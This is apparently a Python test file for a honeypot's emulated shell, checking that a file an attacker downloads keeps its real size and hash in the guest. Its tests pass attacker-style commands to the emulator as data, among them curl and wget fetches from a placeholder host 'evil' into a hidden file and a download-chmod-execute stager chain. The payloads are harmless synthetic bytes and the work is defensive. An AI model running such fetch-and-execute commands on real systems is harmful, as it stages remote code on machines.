r"""The file the attacker downloaded, and the file we archived.

Sixty-seventh coherence sweep, and the one this box's own traffic asked
for. On 2026-08-22 203.0.113.43 logged in as deploy, fetched 8MB from
203.0.113.20:8080 to ~/.sysmonitor and ran it. The digest reported that
single download as *two* uploads:

    upload  /var/lib/honeypot/downloads/2c3ea5f8...  8388608 bytes
    upload  /home/deploy/.sysmonitor                 8388608 bytes
                                                     sha256=0d3bf835...

Same size, two hashes, one file. capture_download keeps the whole body on
disk but hands the shell only the first VFS_STORE_LIMIT bytes, and _fetch
padded that with zeros up to the advertised size. So the copy in the
guest was a 2MB head followed by 6MB of nothing:

  - `sha256sum ~/.sysmonitor` in the guest returned a hash belonging to no
    real file. A dropper that verifies its own payload against a known
    digest -- and some do -- would have concluded the download was
    corrupt.
  - the artifact we archived and the artifact on the box were different
    bytes, so analysing one did not describe the other.
  - the padding allocated the full advertised size in memory, per
    download, per source IP. An 8MB payload cost 8MB; MAX_DOWNLOAD_BYTES
    is 8MB, so that was the ceiling, but it is the same shape of hazard
    the sparse-file work removed from truncate and fallocate.

capture_download now returns the path it stored the artifact at, and the
guest's file points at it: the length is the real length, the bytes are
the real bytes read on demand, and nothing is copied into the per-source
filesystem. sha256sum, md5sum, wc -c, stat and ls all agree with the
archived file.

Run from `honeypot/`, or on the guest.
"""

import hashlib
import os
import resource
import shutil
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import fakeshell as fs                                          # noqa: E402

PASS, FAIL = [], []

# A well-formed x86-64 ELF header, then filler -- so `file` has something
# real to identify and the body is bigger than VFS_STORE_LIMIT.
ELF_HDR = (b"\x7fELF\x02\x01\x01\x00" + b"\x00" * 8 +
           b"\x02\x00" + b">\x00" + b"\x01\x00\x00\x00")
PAYLOAD = ELF_HDR + b"".join(bytes([(i * 7 + 11) & 0xFF]) * 4096
                             for i in range(2048))
DIGEST = hashlib.sha256(PAYLOAD).hexdigest()
MD5 = hashlib.md5(PAYLOAD).hexdigest()

_store = tempfile.mkdtemp(prefix="dltest-")
_artifact = os.path.join(_store, DIGEST)
with open(_artifact, "wb") as _fh:
    _fh.write(PAYLOAD)


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    if not cond:
        print("  FAIL %-48s %s" % (name, detail))


def eq(name, got, want):
    check(name, got == want, "want %r got %r" % (want, got))


def downloader(truncate_to=2 << 20, with_path=True):
    """capture_download's shape: whole body on disk, head in memory."""
    def dl(url):
        d = {"size": len(PAYLOAD), "sha256": DIGEST,
             "head": PAYLOAD[:64], "content": PAYLOAD[:truncate_to]}
        if with_path:
            d["path"] = _artifact
        return d
    return dl


def shell(**kw):
    s = fs.Shell(fs.VFS(), download=downloader(**kw), user="root",
                 peer="203.0.113.77")
    s.exec_mode = True
    return s


def out(s, cmd):
    o = s.run(cmd)
    o += "".join(s._err)
    s._err.clear()
    return o.strip()


# -- the guest's copy is the real thing ----------------------------------

def t_the_size_is_the_real_size():
    s = shell()
    out(s, "curl -sSL http://evil/x -o /root/.sysmonitor")
    eq("stat", out(s, "stat -c '%s' /root/.sysmonitor"), str(len(PAYLOAD)))
    eq("wc -c", out(s, "wc -c < /root/.sysmonitor"), str(len(PAYLOAD)))
    eq("ls -l", out(s, "ls -l /root/.sysmonitor | awk '{print $5}'"),
       str(len(PAYLOAD)))


def t_the_hash_is_the_real_hash():
    """The assertion this whole sweep is about."""
    s = shell()
    out(s, "curl -sSL http://evil/x -o /root/.sysmonitor")
    eq("sha256sum", out(s, "sha256sum /root/.sysmonitor").split()[0], DIGEST)
    eq("md5sum", out(s, "md5sum /root/.sysmonitor").split()[0], MD5)


def t_wget_agrees_with_curl():
    a = shell()
    out(a, "curl -sSL http://evil/x -o /tmp/a")
    b = shell()
    out(b, "wget -qO /tmp/b http://evil/x")
    eq("same hash", out(b, "sha256sum /tmp/b").split()[0],
       out(a, "sha256sum /tmp/a").split()[0])


def t_the_bytes_read_back_are_the_payload():
    s = shell()
    out(s, "curl -sSL http://evil/x -o /tmp/p")
    eq("first bytes", out(s, "head -c 4 /tmp/p | od -An -tx1").split(),
       ["7f", "45", "4c", "46"])
    eq("file identifies it",
       out(s, "file /tmp/p").split(":", 1)[1].strip().split(",")[0],
       "ELF 64-bit LSB pie executable")


def t_no_zero_padding_in_the_middle():
    """The old copy was a head then megabytes of nothing."""
    s = shell()
    out(s, "curl -sSL http://evil/x -o /tmp/p")
    # a byte well past VFS_STORE_LIMIT must not be zero
    off = (3 << 20)
    got = out(s, "tail -c +%d /tmp/p | head -c 1 | od -An -tx1" % (off + 1))
    check("byte at 3MB is real", got.strip() not in ("00", ""), repr(got))


def t_it_costs_no_memory():
    before = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    s = shell()
    out(s, "curl -sSL http://evil/x -o /tmp/p")
    out(s, "stat -c '%s' /tmp/p")
    after = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    grew = (after - before) // 1024
    check("RSS barely moved", grew < 48, "grew %d MB" % grew)


# -- one download is one artifact ----------------------------------------

def t_one_download_reports_one_hash():
    """The digest filed this as two uploads with two hashes."""
    ev = []
    s = fs.Shell(fs.VFS(), download=downloader(),
                 log=lambda **k: ev.append(k), user="root",
                 peer="203.0.113.77")
    s.exec_mode = True
    s.run("curl -sSL http://evil/x -o /root/.sysmonitor")
    s._err.clear()
    hashes = {e.get("sha256") for e in ev
              if e.get("event") in ("download", "payload_written")
              and e.get("sha256")}
    check("at most one hash across the events", len(hashes) <= 1,
          str(hashes))
    if hashes:
        eq("and it is the real one", hashes.pop(), DIGEST)


# -- the fallbacks still work --------------------------------------------

def t_without_a_stored_path_it_still_behaves():
    """Older capture_download, or a self-fetch, returns no path."""
    s = shell(with_path=False)
    out(s, "curl -sSL http://evil/x -o /tmp/p")
    eq("size still advertised", out(s, "stat -c '%s' /tmp/p"),
       str(len(PAYLOAD)))
    check("still readable", out(s, "head -c 4 /tmp/p | od -An -tx1").split()
          == ["7f", "45", "4c", "46"], "")


def t_a_small_body_is_stored_whole():
    """Under the limit there is nothing to point at; keep the bytes."""
    small = b"#!/bin/sh\necho staged\n"
    d = {"size": len(small), "sha256": hashlib.sha256(small).hexdigest(),
         "head": small, "content": small, "path": _artifact}
    s = fs.Shell(fs.VFS(), download=lambda u: d, user="root",
                 peer="203.0.113.77")
    s.exec_mode = True
    o = s.run("curl -sSL http://evil/s.sh -o /tmp/s.sh; cat /tmp/s.sh")
    s._err.clear()
    eq("the stager reads back", o.strip(), "#!/bin/sh\necho staged")


def t_a_stager_still_runs():
    """A small script must still execute through the emulator, so its own
    fetches get captured in turn."""
    body = b"#!/bin/sh\necho second-stage\n"
    d = {"size": len(body), "sha256": hashlib.sha256(body).hexdigest(),
         "head": body, "content": body}
    s = fs.Shell(fs.VFS(), download=lambda u: d, user="root",
                 peer="203.0.113.77")
    s.exec_mode = True
    o = s.run("curl -sSL http://evil/s.sh -o /tmp/s.sh && chmod +x /tmp/s.sh "
              "&& /tmp/s.sh")
    s._err.clear()
    eq("it ran", o.strip(), "second-stage")


def t_a_missing_artifact_falls_back():
    """If the stored file has gone, do not produce a broken read."""
    d = {"size": len(PAYLOAD), "sha256": DIGEST, "head": PAYLOAD[:64],
         "content": PAYLOAD[:1024], "path": os.path.join(_store, "gone")}
    s = fs.Shell(fs.VFS(), download=lambda u: d, user="root",
                 peer="203.0.113.77")
    s.exec_mode = True
    s.run("curl -sSL http://evil/x -o /tmp/p")
    s._err.clear()
    n = s.run("stat -c '%s' /tmp/p").strip()
    s._err.clear()
    check("still reports a size", n.isdigit() and int(n) > 0, n)


def t_the_download_event_carries_the_real_hash():
    ev = []
    s = fs.Shell(fs.VFS(), download=downloader(),
                 log=lambda **k: ev.append(k), user="root",
                 peer="203.0.113.77")
    s.exec_mode = True
    s.run("curl -sSL http://evil/x -o /tmp/p")
    s._err.clear()
    dl = [e for e in ev if e.get("event") == "download"]
    check("download logged", dl, str([e.get("event") for e in ev]))
    if dl:
        eq("sha", dl[0].get("sha256"), DIGEST)
        eq("size", dl[0].get("size"), len(PAYLOAD))


def _cleanup():
    shutil.rmtree(_store, ignore_errors=True)


TESTS = [t_the_size_is_the_real_size, t_the_hash_is_the_real_hash,
         t_wget_agrees_with_curl, t_the_bytes_read_back_are_the_payload,
         t_no_zero_padding_in_the_middle, t_it_costs_no_memory,
         t_one_download_reports_one_hash,
         t_without_a_stored_path_it_still_behaves,
         t_a_small_body_is_stored_whole, t_a_stager_still_runs,
         t_a_missing_artifact_falls_back,
         t_the_download_event_carries_the_real_hash]


def main():
    try:
        for t in TESTS:
            try:
                t()
            except Exception as exc:                          # noqa: BLE001
                check(t.__name__, False, "crashed: %r" % (exc,))
    finally:
        _cleanup()
    print("passed %d, failed %d" % (len(PASS), len(FAIL)))
    if FAIL:
        print("failed: " + ", ".join(FAIL[:8]))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
